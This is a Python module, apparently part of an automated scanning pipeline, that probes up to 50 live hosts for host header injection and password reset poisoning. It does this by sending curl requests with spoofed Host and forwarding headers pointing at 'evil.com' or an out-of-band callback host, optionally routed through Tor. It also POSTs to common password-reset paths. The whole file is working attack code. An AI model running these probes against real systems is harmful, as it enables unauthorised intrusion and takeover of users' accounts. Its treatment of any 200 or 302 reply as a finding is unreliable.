#!/usr/bin/env python3
# modules/step21_host_header.py — Host Header Injection + Password Reset Poisoning
import os
from core.utils import safe_read, count_lines

class HostHeaderStep:
    def __init__(self, p): self.p=p; self.log=p.log; self.f=p.files

    def run(self):
        urls = safe_read(self.f["live_hosts"])[:50]
        out  = self.f["host_header_results"]
        found = 0

        evil_host = "evil.com"
        if self.p.oob:
            evil_host = self.p.oob.get_payload("host_header",
                                                 "host_header_test").replace("http://","")

        HEADER_COMBOS = [
            {"Host": evil_host},
            {"Host": evil_host, "X-Forwarded-Host": evil_host},
            {"X-Forwarded-Host": evil_host},
            {"X-Host": evil_host},
            {"X-Forwarded-Server": evil_host},
            {"X-HTTP-Host-Override": evil_host},
            {"Forwarded": f"host={evil_host}"},
        ]

        for url in urls:
            for headers in HEADER_COMBOS:
                header_flags = " ".join(f"-H '{k}: {v}'" for k,v in headers.items())
                result = self.p.shell(
                    f"curl -sk --connect-timeout 5 {header_flags} "
                    f"-D - '{url}' 2>/dev/null | head -50",
                    use_tor=bool(self.p.tor))

                if evil_host in result:
                    line = f"HOST_HEADER_INJECTION: {url} | headers={headers}"
                    with open(out,"a") as f: f.write(line+"\n")
                    self.p.add_finding("high","HOST_HEADER_INJECTION",url,
                                       f"Reflected in response: {list(headers.keys())}",
                                       "host-header-engine")
                    found += 1
                    break  # Found for this URL, move on

            # Password reset endpoint specific test
            for reset_path in ["/forgot-password","/reset-password","/account/reset",
                                "/password/reset","/auth/forgot"]:
                reset_url = url.rstrip("/") + reset_path
                result = self.p.shell(
                    f"curl -sk --connect-timeout 5 "
                    f"-H 'Host: {evil_host}' "
                    f"-H 'X-Forwarded-Host: {evil_host}' "
                    f"-X POST -d 'email=test@test.com' "
                    f"'{reset_url}' -o /dev/null -w '%{{http_code}}'")
                if result.strip() in ("200","302"):
                    self.p.add_finding("high","PASSWORD_RESET_POISONING",reset_url,
                                       "Password reset endpoint accepts injected Host header",
                                       "host-header-engine")
                    found += 1

        self.log.success(f"Host Header Injection: {found}")
